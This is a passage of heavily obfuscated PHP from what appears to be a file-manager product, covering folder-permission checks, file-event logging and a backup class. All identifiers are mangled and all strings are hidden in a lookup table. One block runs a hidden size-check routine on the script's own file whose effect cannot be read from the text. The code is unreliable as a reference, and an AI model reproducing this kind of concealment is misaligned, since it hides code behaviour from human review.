$¡¼÷şó = array_unique($¡¼÷şó); if (AuthModel::authCheckRoot($Ğ¸ÈÍš³[$¸²ÒÈ“›[490]][$¸²ÒÈ“›[491]])) { $¡¼÷şó[] = USER_ID; } $Ğ¸ÈÍš³[$¸²ÒÈ“›[490]][$¸²ÒÈ“›[2218]] = Model($¸²ÒÈ“›[582])->userListInfo($¡¼÷şó); return $Ğ¸ÈÍš³; } private function authFolderOwnerGroup($¯²Šå) { $–¥ŸŒ¤¼ =& $_SERVER[ÅÄÇĞô]; $õ°œÍÒ’ = Model($–¥ŸŒ¤¼[2092])->where(array($–¥ŸŒ¤¼[1998] => $¯²Šå))->select(); $¿Ù›¯Èí = array(); if (!$õ°œÍÒ’) { return $¿Ù›¯Èí; } foreach ($õ°œÍÒ’ as $¥²²ü‰µ) { $½’Ğ¿¯ğ = $this->authInfo($¥²²ü‰µ); if (AuthModel::authCheckRoot($½’Ğ¿¯ğ[$–¥ŸŒ¤¼[490]])) { $¿Ù›¯Èí[] = $¥²²ü‰µ[$–¥ŸŒ¤¼[1797]]; } } return $¿Ù›¯Èí; } private function authFolderOwnerUser($õä†ãÛ†) { $“ÏÁó¶¹ =& $_SERVER[ÅÄÇĞô]; $´íœ†ÙÅ = array(); $©ÀÂåî› = !1; foreach ($õä†ãÛ† as $ÓßÃšŠÍ) { $şŠ—æ­ = $this->authInfo($ÓßÃšŠÍ); if ($ÓßÃšŠÍ[$“ÏÁó¶¹[574]] == $“ÏÁó¶¹[231]) { $©ÀÂåî› = !0; } if ($ÓßÃšŠÍ[$“ÏÁó¶¹[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($şŠ—æ­[$“ÏÁó¶¹[490]])) { $´íœ†ÙÅ[] = $ÓßÃšŠÍ[$“ÏÁó¶¹[574]]; } } } return array($“ÏÁó¶¹[670] => $´íœ†ÙÅ, $“ÏÁó¶¹[2217] => $©ÀÂåî›); } public function authMake($’ü¬ÓùŸ, $èûùñŸ = false) { $ÙçÑ¾¦î =& $_SERVER[ÅÄÇĞô]; $ªıá†ÒØ = $this->authArrayCheck($’ü¬ÓùŸ, $èûùñŸ); if ($ªıá†ÒØ[$ÙçÑ¾¦î[2219]]) { $ªıá†ÒØ[$ÙçÑ¾¦î[2219]] = $this->sourceAuthInfo($ªıá†ÒØ[$ÙçÑ¾¦î[2219]]); } return $ªıá†ÒØ; } public function authArrayCheck($è¸ÕÙç¨, $£¾¥‰Ö = false) { $¿Ì„ı =& $_SERVER[ÅÄÇĞô]; if (!$è¸ÕÙç¨) { return array($¿Ì„ı[491] => 0, $¿Ì„ı[545] => !1); } $£¾¥‰Ö = $£¾¥‰Ö ? $£¾¥‰Ö : USER_ID; $œËï—Ÿ¾ = 0; $ÖãòÆÃ = 0; $øâèĞÃ = 0; $î‘†Ø£¤ = 0; $»ƒ½«Ø = 0; $Ã•úÕÈƒ = 0; $ø¥ Ü = 1000; $¶Š×şŸé = 0; $ğÆşóàÎ = 0; $³ßÃ€×Õ = 0; $€ş—óÂ– = 0; $ÅµšîĞç = array($¿Ì„ı[194] => 0); foreach ($è¸ÕÙç¨ as $ÅµšîĞç) { $¡øÙÑüå = $this->authInfo($ÅµšîĞç); if (!$¡øÙÑüå) { continue; } $·šƒÊ¤¡ = $ÅµšîĞç[$¿Ì„ı[574]]; $ûØ“ƒÈÉ = intval($¡øÙÑüå[$¿Ì„ı[490]]); if ($ÅµšîĞç[$¿Ì„ı[191]] == SourceModel::TYPE_USER && $·šƒÊ¤¡ == $£¾¥‰Ö) { $œËï—Ÿ¾ = !0; $øâèĞÃ = $¡øÙÑüå; $ÖãòÆÃ = $ûØ“ƒÈÉ; } else { if ($ÅµšîĞç[$¿Ì„ı[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($·šƒÊ¤¡, $£¾¥‰Ö)) { $î‘†Ø£¤ = !0; $¼Ú•³¢» = $this->groupStepToUserGroup($·šƒÊ¤¡, $£¾¥‰Ö); if ($¼Ú•³¢» < $ø¥ Ü) { $ø¥ Ü = $¼Ú•³¢»; $»ƒ½«Ø = $ûØ“ƒÈÉ; $Ã•úÕÈƒ = $¡øÙÑüå; $¶Š×şŸé = $·šƒÊ¤¡; } if ($¼Ú•³¢» == $ø¥ Ü && $ûØ“ƒÈÉ >= $»ƒ½«Ø) { $»ƒ½«Ø = $ûØ“ƒÈÉ; $Ã•úÕÈƒ = $¡øÙÑüå; $¶Š×şŸé = $·šƒÊ¤¡; } } else { if ($·šƒÊ¤¡ == $¿Ì„ı[231]) { $ğÆşóàÎ = !0; $€ş—óÂ– = $¡øÙÑüå; $³ßÃ€×Õ = $ûØ“ƒÈÉ; } } } } if ($œËï—Ÿ¾) { $®ŞæÂÓµ = $ÖãòÆÃ; $¡øÙÑüå = $øâèĞÃ; $‡ç”Ë·â = LNG($¿Ì„ı[2220]); } else { if ($î‘†Ø£¤) { $®ŞæÂÓµ = $»ƒ½«Ø; $¡øÙÑüå = $Ã•úÕÈƒ; $ÁÂßâĞ = Model($¿Ì„ı[590])->getInfo($¶Š×şŸé); $‡ç”Ë·â = $¿Ì„ı[176] . $ÁÂßâĞ[$¿Ì„ı[594]] . $¿Ì„ı[2221] . LNG($¿Ì„ı[2222]); } else { if ($ğÆşóàÎ) { $®ŞæÂÓµ = $³ßÃ€×Õ; $¡øÙÑüå = $€ş—óÂ–; $‡ç”Ë·â = LNG($¿Ì„ı[2192]); } else { $®ŞæÂÓµ = 0; $¡øÙÑüå = !1; $‡ç”Ë·â = $¿Ì„ı[12]; } } } $—ËÇğ«É = array($¿Ì„ı[2212] => intval($®ŞæÂÓµ), $¿Ì„ı[2195] => $¡øÙÑüå, $¿Ì„ı[2213] => $‡ç”Ë·â, $¿Ì„ı[2204] => $ÅµšîĞç[$¿Ì„ı[194]]); return $—ËÇğ«É; } private function groupContainUser($ƒÇöº±Ø, $‰˜çñ¾“ = false) { return in_array($ƒÇöº±Ø, $this->userGroupParents($‰˜çñ¾“)); } private function groupStepToUserGroup($Òİ¥áıÜ, $¹‹ü¤ = false) { $ºÃòœÃ =& $_SERVER[ÅÄÇĞô]; $Áëé¯†Õ = $this->userGroupList($¹‹ü¤); $œä¤Âñİ = 1000; $Ò÷Ù¾ä = $GLOBALS[$ºÃòœÃ[6]][$ºÃòœÃ[92]][$ºÃòœÃ[2105]] == 1; $Á£ö÷ = $Ò÷Ù¾ä ? 3 : 2; foreach ($Áëé¯†Õ as $§Š¬àŸæ) { if ($§Š¬àŸæ[$ºÃòœÃ[1998]] == $Òİ¥áıÜ) { return 0; } $£¤¡©ùú = explode($ºÃòœÃ[50], trim($§Š¬àŸæ[$ºÃòœÃ[589]], $ºÃòœÃ[50])); if ($£¤¡©ùú[0] == $ºÃòœÃ[231] && count($£¤¡©ùú) > $Á£ö÷) { $®¡¤š½ = array_reverse(array_slice($£¤¡©ùú, $Á£ö÷)); $ØÒÊ´º¨ = array_search($Òİ¥áıÜ, $®¡¤š½); if ($ØÒÊ´º¨ !== !1 && $ØÒÊ´º¨ + 1 <= $œä¤Âñİ) { $œä¤Âñİ = $ØÒÊ´º¨ + 1; } } } return $œä¤Âñİ; } private function userGroupList($¦¥ñ®Ù = false) { $ÛÊ€íí =& $_SERVER[ÅÄÇĞô]; static $Úšåë† = array(); if (isset($Úšåë†[$¦¥ñ®Ù])) { return $Úšåë†[$¦¥ñ®Ù]; } $Ã”ÎùØ£ = Model($ÛÊ€íí[602])->getInfo($¦¥ñ®Ù); $Úšåë†[$¦¥ñ®Ù] = array_to_keyvalue($Ã”ÎùØ£[$ÛÊ€íí[2193]], $ÛÊ€íí[1998]); return $Úšåë†[$¦¥ñ®Ù]; } public function userGroupParents($í²À‹ªŸ) { $ªŒÙø‰¹ =& $_SERVER[ÅÄÇĞô]; static $ì†›óÓŸ = array(); $í²À‹ªŸ = $í²À‹ªŸ ? $í²À‹ªŸ : USER_ID; if (isset($ì†›óÓŸ[$í²À‹ªŸ])) { return $ì†›óÓŸ[$í²À‹ªŸ]; } $Ÿò¡Ş² = $this->userGroupList($í²À‹ªŸ); $¤•À¡„ = array(); $È£ŞÀıŠ = $GLOBALS[$ªŒÙø‰¹[6]][$ªŒÙø‰¹[92]][$ªŒÙø‰¹[2105]] == 1; $ÙùÇÃ¦Ô = $È£ŞÀıŠ ? 3 : 2; foreach ($Ÿò¡Ş² as $„‰éã¨’) { $˜âÆõøí = array($„‰éã¨’[$ªŒÙø‰¹[1998]]); $ÉÁ¶€² = explode($ªŒÙø‰¹[50], trim($„‰éã¨’[$ªŒÙø‰¹[589]], $ªŒÙø‰¹[50])); if ($ÉÁ¶€²[0] == $ªŒÙø‰¹[231] && count($ÉÁ¶€²) > $ÙùÇÃ¦Ô) { $ÎßÍÆ×ù = array_slice($ÉÁ¶€², $ÙùÇÃ¦Ô); $˜âÆõøí = array_merge($˜âÆõøí, array_reverse($ÎßÍÆ×ù)); } $¤•À¡„ = array_merge($¤•À¡„, $˜âÆõøí); } $ì†›óÓŸ[$í²À‹ªŸ] = array_unique($¤•À¡„); return $ì†›óÓŸ[$í²À‹ªŸ]; } public function authTargetInfoMake($¦æ…Æõ) { $¦İ÷êŞ =& $_SERVER[ÅÄÇĞô]; $ÓÔ‡¶Ş¢ = array(); $Ò²àì‡Â = array(); foreach ($¦æ…Æõ as $¯‹ë·Ş€) { if ($¯‹ë·Ş€[$¦İ÷êŞ[191]] == SourceModel::TYPE_USER) { $ÓÔ‡¶Ş¢[] = intval($¯‹ë·Ş€[$¦İ÷êŞ[574]]); } else { if ($¯‹ë·Ş€[$¦İ÷êŞ[191]] == SourceModel::TYPE_GROUP) { $Ò²àì‡Â[] = intval($¯‹ë·Ş€[$¦İ÷êŞ[574]]); } } } if ($ÓÔ‡¶Ş¢) { $ÓÔ‡¶Ş¢ = Model($¦İ÷êŞ[582])->userListInfo($ÓÔ‡¶Ş¢); } if ($Ò²àì‡Â) { $Ìëµ•ÁË = array($¦İ÷êŞ[2090] => array($¦İ÷êŞ[495], $Ò²àì‡Â)); $Ò²àì‡Â = Model($¦İ÷êŞ[590])->field($¦İ÷êŞ[2223])->where($Ìëµ•ÁË)->select(); $Ò²àì‡Â = array_to_keyvalue($Ò²àì‡Â, $¦İ÷êŞ[1998]); } return array($¦İ÷êŞ[2224] => $ÓÔ‡¶Ş¢, $¦İ÷êŞ[2225] => $Ò²àì‡Â); } public function authInfo($Ñß™è·) { $Ã°¢½³ =& $_SERVER[ÅÄÇĞô]; if ($Ñß™è·[$Ã°¢½³[2106]]) { $ˆØµŠâ = Model($Ã°¢½³[576])->listData($Ñß™è·[$Ã°¢½³[2106]]); if (!$ˆØµŠâ) { return !1; $ÏÎ‘ä£ = Model($Ã°¢½³[576])->listData(); $œ§‘¡¡ = array_filter_by_field($ÏÎ‘ä£, $Ã°¢½³[490], $Ã°¢½³[231]); return $œ§‘¡¡; } $ä”Òâü = array_field_key($ˆØµŠâ, array($Ã°¢½³[478], $Ã°¢½³[32], $Ã°¢½³[490], $Ã°¢½³[2021], $Ã°¢½³[2022])); $ä”Òâü[$Ã°¢½³[2226]] = $Ñß™è·; return $ä”Òâü; } else { return array($Ã°¢½³[496] => 0, $Ã°¢½³[2004] => $Ñß™è·[$Ã°¢½³[2170]], $Ã°¢½³[497] => $Ã°¢½³[12], $Ã°¢½³[2021] => $Ã°¢½³[2227]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\x72\x63\145\x5f\145\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\145\141\164\x65\124\151\x6d\145", "\x74\151\x6d\x65", "\x69\x6e\163\145\x72\164", "\x66\x75\x6e\x63\x74\151\x6f\156"), array("\x64\145\x73\x63", '', "\151\x6e\x73\145\162\164\54\165\x70\144\x61\x74\x65\54\x73\x65\154\x65\x63\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($›è¾©€Å, $‘£ªğÇİ, $Ş¤¤´³Ê = '') { $èÙ–ë‹Ê =& $_SERVER[ÅÄÇĞô]; if (!$this->eventSave) { return; } $„¬¼òï­ = Model($èÙ–ë‹Ê[1444])->sourceInfo($›è¾©€Å); if (!$„¬¼òï­) { return !1; } if ($this->isDisableEvent($„¬¼òï­, $‘£ªğÇİ)) { return; } if ($Ş¤¤´³Ê && is_string($Ş¤¤´³Ê)) { $Ş¤¤´³Ê = array($èÙ–ë‹Ê[2037] => $Ş¤¤´³Ê); } $ëíÃèò… = defined($èÙ–ë‹Ê[2228]) ? USER_ID : 0; $‘—óÇø = array($èÙ–ë‹Ê[494] => $›è¾©€Å, $èÙ–ë‹Ê[2229] => $„¬¼òï­[$èÙ–ë‹Ê[193]], $èÙ–ë‹Ê[2230] => $„¬¼òï­[$èÙ–ë‹Ê[32]], $èÙ–ë‹Ê[587] => !empty($„¬¼òï­[$èÙ–ë‹Ê[587]]) ? $„¬¼òï­[$èÙ–ë‹Ê[587]] : $èÙ–ë‹Ê[12], $èÙ–ë‹Ê[1788] => $ëíÃèò…, $èÙ–ë‹Ê[499] => $‘£ªğÇİ, $èÙ–ë‹Ê[1790] => $Ş¤¤´³Ê); $this->addSystemLog($‘£ªğÇİ, $‘—óÇø); unset($‘—óÇø[$èÙ–ë‹Ê[2230]], $‘—óÇø[$èÙ–ë‹Ê[587]]); return $this->add($‘—óÇø); } private function addSystemLog($ÔÄÄß¦, $ÚÌ×°½) { $ŠûÖÍŞĞ =& $_SERVER[ÅÄÇĞô]; if ($ÔÄÄß¦ == $ŠûÖÍŞĞ[2231]) { $ÔÄÄß¦ = $ÚÌ×°½[$ŠûÖÍŞĞ[529]][$ŠûÖÍŞĞ[2232]]; } else { if (in_array($ÔÄÄß¦, array($ŠûÖÍŞĞ[1977], $ŠûÖÍŞĞ[2233]))) { $ÔÄÄß¦ = $ÚÌ×°½[$ŠûÖÍŞĞ[529]][$ŠûÖÍŞĞ[171]]; } } $æÌ­…ÆÕ = array_merge($ÚÌ×°½, array($ŠûÖÍŞĞ[2234] => $ÚÌ×°½[$ŠûÖÍŞĞ[194]], $ŠûÖÍŞĞ[2235] => $ÚÌ×°½[$ŠûÖÍŞĞ[2235]])); Hook::trigger($ŠûÖÍŞĞ[2236], $ŠûÖÍŞĞ[2237] . $ÔÄÄß¦, $ÚÌ×°½); Model($ŠûÖÍŞĞ[1941])->addLog($ŠûÖÍŞĞ[2237] . $ÔÄÄß¦, $æÌ­…ÆÕ); } private function isDisableEvent($ãÍ‰Ä, $«ÒÒÂ„) { $ó½êÁß… =& $_SERVER[ÅÄÇĞô]; if ($ãÍ‰Ä[$ó½êÁß…[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($«ÒÒÂ„ == $ó½êÁß…[1966]) { return !1; } return !0; } public function eventCreate($í¢€Ğî, $íÀöê©‰) { $„šíÍ¬› =& $_SERVER[ÅÄÇĞô]; $áß˜ä©© = Model($„šíÍ¬›[1444])->sourceInfo($í¢€Ğî); $ã¬Ï¥ – = array($„šíÍ¬›[2232] => $íÀöê©‰, $„šíÍ¬›[32] => $áß˜ä©©[$„šíÍ¬›[32]]); return $this->addEvent($í¢€Ğî, $„šíÍ¬›[2231], $ã¬Ï¥ –); } public function eventFileEdit($û‰Àšê) { $º’âŸì‘ =& $_SERVER[ÅÄÇĞô]; $ù êµ°è = array($º’âŸì‘[2238] => $_SERVER[$º’âŸì‘[2239]], $º’âŸì‘[2240] => strtolower(ACTION)); if (isset($GLOBALS[$º’âŸì‘[7]][$º’âŸì‘[2241]])) { $ù êµ°è[$º’âŸì‘[2241]] = $º’âŸì‘[91]; } return $this->addEvent($û‰Àšê, $º’âŸì‘[1967], $ù êµ°è); } public function eventRecycle($ÕêœÍµ, $Òµ¬¯’Ñ) { return $this->addEvent($ÕêœÍµ, $_SERVER[ÅÄÇĞô][2233], $Òµ¬¯’Ñ); } private static $_removeLast = ''; public function eventRemove($Œ“…ù) { $µ€”‰õ© =& $_SERVER[ÅÄÇĞô]; self::$_removeLast = $Œ“…ù; $ÜÎËÇáï = Model($µ€”‰õ©[1444])->sourceInfo($Œ“…ù); $ùÙòÏµÀ = array_field_key($ÜÎËÇáï, array($µ€”‰õ©[194], $µ€”‰õ©[546], $µ€”‰õ©[508], $µ€”‰õ©[589])); $ê´ÖÔÛ¹ = array($µ€”‰õ©[171] => $ÜÎËÇáï[$µ€”‰õ©[32]], $µ€”‰õ©[2240] => ACTION, $µ€”‰õ©[2242] => $ùÙòÏµÀ); return $this->addEvent($ÜÎËÇáï[$µ€”‰õ©[193]], $µ€”‰õ©[1966], $ê´ÖÔÛ¹); } public function eventShare($à¢½ö¯Ø, $çıÉèš) { return $this->addEvent($à¢½ö¯Ø, $_SERVER[ÅÄÇĞô][1977], $çıÉèš); } public function eventMove($ª×´ˆ‹¡, $¿˜ÖöÁ, $Îˆ‘“Å±) { $¥ÔÛâş­ =& $_SERVER[ÅÄÇĞô]; if (self::$_removeLast == $ª×´ˆ‹¡) { return; } $è¶•è“ = Model($¥ÔÛâş­[1444]); $³¨·ñ³Ÿ = $è¶•è“->sourceInfo($ª×´ˆ‹¡); $ë ñº÷« = $è¶•è“->sourceInfo($¿˜ÖöÁ); $ÙëÀ½Õ = $è¶•è“->sourceInfo($Îˆ‘“Å±); $Œâ®š® = array($¥ÔÛâş­[1264] => $¿˜ÖöÁ, $¥ÔÛâş­[2243] => $ë ñº÷«[$¥ÔÛâş­[32]], $¥ÔÛâş­[2219] => !empty($ë ñº÷«[$¥ÔÛâş­[587]]) ? $ë ñº÷«[$¥ÔÛâş­[587]] : $¥ÔÛâş­[12], $¥ÔÛâş­[1265] => $Îˆ‘“Å±, $¥ÔÛâş­[2244] => $ÙëÀ½Õ[$¥ÔÛâş­[32]], $¥ÔÛâş­[2245] => !empty($ÙëÀ½Õ[$¥ÔÛâş­[587]]) ? $ÙëÀ½Õ[$¥ÔÛâş­[587]] : $¥ÔÛâş­[12]); $this->addEvent($ª×´ˆ‹¡, $¥ÔÛâş­[628], $Œâ®š®); $³¨·ñ³Ÿ = $è¶•è“->sourceInfo($ª×´ˆ‹¡); $Œâ®š® = array($¥ÔÛâş­[194] => $³¨·ñ³Ÿ[$¥ÔÛâş­[194]], $¥ÔÛâş­[32] => $³¨·ñ³Ÿ[$¥ÔÛâş­[32]]); $this->addEvent($¿˜ÖöÁ, $¥ÔÛâş­[2246], $Œâ®š®); } public function eventCopy($—êûÏ”Ô) { $this->eventCreate($—êûÏ”Ô, $_SERVER[ÅÄÇĞô][626]); } public function eventRename($ñöÕ…, $ä¬¡‹»Ñ, $Ù‡ş±…¬) { $”Ëà¡µÎ =& $_SERVER[ÅÄÇĞô]; $¼«ŸŠÇ = array($”Ëà¡µÎ[1264] => $ä¬¡‹»Ñ, $”Ëà¡µÎ[1265] => $Ù‡ş±…¬); return $this->addEvent($ñöÕ…, $”Ëà¡µÎ[1458], $¼«ŸŠÇ); } public function eventAddComment($”ÜğÛş½, $æçìĞ®Š) { return $this->addEvent($”ÜğÛş½, $_SERVER[ÅÄÇĞô][2247], $æçìĞ®Š); } public function eventAddDesc($†ÑÚß¥Ô, $ª÷ğ…) { return $this->addEvent($†ÑÚß¥Ô, $_SERVER[ÅÄÇĞô][2248], $ª÷ğ…); } public function listBySource($çÇğ¿é) { $‹Ê¶ëÎ­ =& $_SERVER[ÅÄÇĞô]; $ğ¢Ú¿—÷ = Model($‹Ê¶ëÎ­[1444])->sourceInfo($çÇğ¿é); $şåêäù = array($‹Ê¶ëÎ­[494] => $çÇğ¿é); if ($ğ¢Ú¿—÷[$‹Ê¶ëÎ­[488]] == $‹Ê¶ëÎ­[91]) { $İ¢Ë¤Ğ = Model($‹Ê¶ëÎ­[1444])->listSearchChildren($çÇğ¿é, 20000); $İ¢Ë¤Ğ[] = $çÇğ¿é . $‹Ê¶ëÎ­[457]; $şåêäù = array($‹Ê¶ëÎ­[194] => array($‹Ê¶ëÎ­[7], $İ¢Ë¤Ğ)); } $²ô£«©† = $this->where($şåêäù)->order($‹Ê¶ëÎ­[2249])->selectPage(); if ($²ô£«©†[$‹Ê¶ëÎ­[445]][$‹Ê¶ëÎ­[446]] == 0) { $²ô£«©†[$‹Ê¶ëÎ­[445]][$‹Ê¶ëÎ­[446]] = 1; $²ô£«©†[$‹Ê¶ëÎ­[448]] = array(array($‹Ê¶ëÎ­[494] => $çÇğ¿é, $‹Ê¶ëÎ­[2229] => $ğ¢Ú¿—÷[$‹Ê¶ëÎ­[193]], $‹Ê¶ëÎ­[1788] => $ğ¢Ú¿—÷[$‹Ê¶ëÎ­[530]], $‹Ê¶ëÎ­[499] => $‹Ê¶ëÎ­[2250], $‹Ê¶ëÎ­[500] => $ğ¢Ú¿—÷[$‹Ê¶ëÎ­[234]], $‹Ê¶ëÎ­[1790] => $‹Ê¶ëÎ­[12])); } return $this->eventListParse($²ô£«©†, $çÇğ¿é); } private function eventListParse($«³ÌÒ‰Ç, $³™Éï©õ) { $†ºÛ‡™ò =& $_SERVER[ÅÄÇĞô]; $é¾•„ê = $«³ÌÒ‰Ç[$†ºÛ‡™ò[448]]; $Šè¤­áˆ = array_to_keyvalue($é¾•„ê, $†ºÛ‡™ò[12], $†ºÛ‡™ò[194]); $»óíşş° = array_to_keyvalue($é¾•„ê, $†ºÛ‡™ò[12], $†ºÛ‡™ò[2235]); foreach ($é¾•„ê as $Ê’ÍØ¢Â) { $ÁÏˆ³ë­ = $Ê’ÍØ¢Â[$†ºÛ‡™ò[529]]; if ($Ê’ÍØ¢Â[$†ºÛ‡™ò[33]] == $†ºÛ‡™ò[628] && isset($ÁÏˆ³ë­[$†ºÛ‡™ò[1264]])) { $Šè¤­áˆ[] = $ÁÏˆ³ë­[$†ºÛ‡™ò[1264]] . $†ºÛ‡™ò[12]; $Šè¤­áˆ[] = $ÁÏˆ³ë­[$†ºÛ‡™ò[1265]] . $†ºÛ‡™ò[12]; } if ($Ê’ÍØ¢Â[$†ºÛ‡™ò[33]] == $†ºÛ‡™ò[2246] && isset($ÁÏˆ³ë­[$†ºÛ‡™ò[194]])) { $Šè¤­áˆ[] = $ÁÏˆ³ë­[$†ºÛ‡™ò[194]] . $†ºÛ‡™ò[12]; } } $Šè¤­áˆ = array_merge($Šè¤­áˆ, $»óíşş°, array($³™Éï©õ . $†ºÛ‡™ò[12])); $Šè¤­áˆ = array_unique($Šè¤­áˆ); $œ§ôï¨õ = array_unique(array_to_keyvalue($é¾•„ê, $†ºÛ‡™ò[12], $†ºÛ‡™ò[1797])); $äõşæâ¡ = Model($†ºÛ‡™ò[602])->userListInfo($œ§ôï¨õ); $ÚÓ··–ı = Model($†ºÛ‡™ò[925])->sourceListInfo($Šè¤­áˆ, !0); foreach ($é¾•„ê as &$Ê’ÍØ¢Â) { if ($Ê’ÍØ¢Â[$†ºÛ‡™ò[33]] == $†ºÛ‡™ò[628] && isset($Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[1264]])) { $Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[1264]] = $ÚÓ··–ı[$Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[1264]]]; $Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[1265]] = $ÚÓ··–ı[$Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[1265]]]; } if ($Ê’ÍØ¢Â[$†ºÛ‡™ò[33]] == $†ºÛ‡™ò[2246] && isset($Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[194]])) { $Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[194]] = $ÚÓ··–ı[$Ê’ÍØ¢Â[$†ºÛ‡™ò[529]][$†ºÛ‡™ò[194]]]; } $Ê’ÍØ¢Â[$†ºÛ‡™ò[90]] = $ÚÓ··–ı[$Ê’ÍØ¢Â[$†ºÛ‡™ò[194]]]; $Ê’ÍØ¢Â[$†ºÛ‡™ò[2251]] = $ÚÓ··–ı[$Ê’ÍØ¢Â[$†ºÛ‡™ò[2235]]]; if ($Ê’ÍØ¢Â[$†ºÛ‡™ò[33]] == $†ºÛ‡™ò[1966]) { $Ê’ÍØ¢Â[$†ºÛ‡™ò[2251]] = $Ê’ÍØ¢Â[$†ºÛ‡™ò[90]]; $Ê’ÍØ¢Â[$†ºÛ‡™ò[2235]] = $Ê’ÍØ¢Â[$†ºÛ‡™ò[2251]][$†ºÛ‡™ò[194]]; $Ê’ÍØ¢Â[$†ºÛ‡™ò[90]] = !1; $Ê’ÍØ¢Â[$†ºÛ‡™ò[194]] = $†ºÛ‡™ò[12]; } $Ê’ÍØ¢Â[$†ºÛ‡™ò[2178]] = $äõşæâ¡[$Ê’ÍØ¢Â[$†ºÛ‡™ò[1797]]]; } unset($Ê’ÍØ¢Â); $«³ÌÒ‰Ç[$†ºÛ‡™ò[448]] = $é¾•„ê; return $«³ÌÒ‰Ç; } public function removeBySource($ØßÍé¡„) { $üñì›×ø = array($_SERVER[ÅÄÇĞô][494] => $ØßÍé¡„); $this->where($üñì›×ø)->remove(); } } goto båç—†²·‰; A§¿¬ƒ„…: $_size = $_SERVER[ÅÄÇĞô][836]; if ($_SERVER[$_SERVER[ÅÄÇĞô][837]] != $_size($_file)) { $_getc = $_SERVER[ÅÄÇĞô][838]; $_getfile = $_SERVER[$_SERVER[ÅÄÇĞô][839]] . $_SERVER[ÅÄÇĞô][840]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÅÄÇĞô][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÅÄÇĞô][688]) { $exit = $_SERVER[ÅÄÇĞô][841]; $exit(); } $_act = $_SERVER[ÅÄÇĞô][842]; $_act($_file); } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ÅÄÇĞô][843]); $this->init(); $this->keep(); } public function init() { $Ç„‚³î¡ =& $_SERVER[ÅÄÇĞô]; $this->isManual(); self::$name = date($Ç„‚³î¡[844]); if (!($™œ”åé£ = $this->model->lastItem())) { $™œ”åé£ = $this->initData(); } else { self::$name = $™œ”åé£[$Ç„‚³î¡[32]]; if ($™œ”åé£[$Ç„‚³î¡[845]] == $Ç„‚³î¡[91]) { self::$name = date($Ç„‚³î¡[262]); $ÒŞÄ–ğö = intval(_get($™œ”åé£, $Ç„‚³î¡[846], 0)); if (self::$manual == 0 && $™œ”åé£[$Ç„‚³î¡[32]] == self::$name) { $this->model->remove($™œ”åé£[$Ç„‚³î¡[478]]); } $™œ”åé£ = $this->initData($ÒŞÄ–ğö, $™œ”åé£[$Ç„‚³î¡[847]]); } else { $this->checkStore($™œ”åé£[$Ç„‚³î¡[847]]); } } self::$option = $™œ”åé£; } private function isManual() { $´Ê¦­õ± = _get($GLOBALS, $_SERVER[ÅÄÇĞô][848], 0); $´Ê¦­õ± = intval($´Ê¦­õ±); self::$manual = $´Ê¦­õ± && $´Ê¦­õ± == 1 ? 1 : 0; } private function initData($óÌ¨‚ = 0, $îÔˆÒ½ı = '') { $êİË¦‡ =& $_SERVER[ÅÄÇĞô]; $èşãàõÎ = $this->model->config(); if ($îÔˆÒ½ı && $èşãàõÎ[$êİË¦‡[847]] != $îÔˆÒ½ı) { $óÌ¨‚ = 0; } $this->checkStore($èşãàõÎ[$êİË¦‡[847]]); if (self::$manual == 1) { self::$name .= $êİË¦‡[11] . date($êİË¦‡[849]); } $Ç²²‹êÈ = array($êİË¦‡[847] => $èşãàõÎ[$êİË¦‡[847]], $êİË¦‡[32] => self::$name, $êİË¦‡[845] => 0, $êİË¦‡[171] => $èşãàõÎ[$êİË¦‡[171]], $êİË¦‡[850] => self::$manual, $êİË¦‡[371] => array($êİË¦‡[851] => array($êİË¦‡[845] => 0), $êİË¦‡[852] => array($êİË¦‡[845] => 0, $êİË¦‡[853] => 0, $êİË¦‡[854] => 0, $êİË¦‡[33] => $êİË¦‡[12], $êİË¦‡[855] => 0, $êİË¦‡[856] => 0), $êİË¦‡[857] => array($êİË¦‡[845] => 0, $êİË¦‡[853] => 0, $êİË¦‡[854] => 0, $êİË¦‡[855] => 0, $êİË¦‡[856] => 0), $êİË¦‡[233] => array($êİË¦‡[845] => 0, $êİË¦‡[858] => 0, $êİË¦‡[859] => 0, $êİË¦‡[860] => 0, $êİË¦‡[861] => 0, $êİË¦‡[546] => $óÌ¨‚, $êİË¦‡[855] => 0, $êİË¦‡[856] => 0)), $êİË¦‡[855] => time(), $êİË¦‡[856] => 0); $‘Ë›ñ¯° = $this->model->insert($Ç²²‹êÈ); $Ç²²‹êÈ[$êİË¦‡[478]] = $‘Ë›ñ¯°; return $Ç²²‹êÈ; } private function checkStore($Ü½‰âÃã) { $¤Œ’ú£ = Model($_SERVER[ÅÄÇĞô][862]); $“âîÒî“ = $¤Œ’ú£->listData($Ü½‰âÃã); $¤Œ’ú£->checkConfig($“âîÒî“); } public static function get() { if (!self::$option) { $‹Àµ“¹˜ = Model($_SERVER[ÅÄÇĞô][843]); $¥Ë¾úëÍ = $‹Àµ“¹˜->findByName(self::$name); $‹Àµ“¹˜->parseContent($¥Ë¾úëÍ); self::$option = $¥Ë¾úëÍ; } return self::$option; } public static function set($×ŞªÍº) { $ÒÉòˆÓë =& $_SERVER[ÅÄÇĞô]; $áíË¾çú = self::get(); foreach ($×ŞªÍº as $¶’´ƒÓš => $¯ÎÆØº) { array_set_value($áíË¾çú, $¶’´ƒÓš, $¯ÎÆØº); } Model($ÒÉòˆÓë[843])->update($áíË¾çú[$ÒÉòˆÓë[478]], $áíË¾çú); self::$option = $áíË¾çú; return self::$option; } 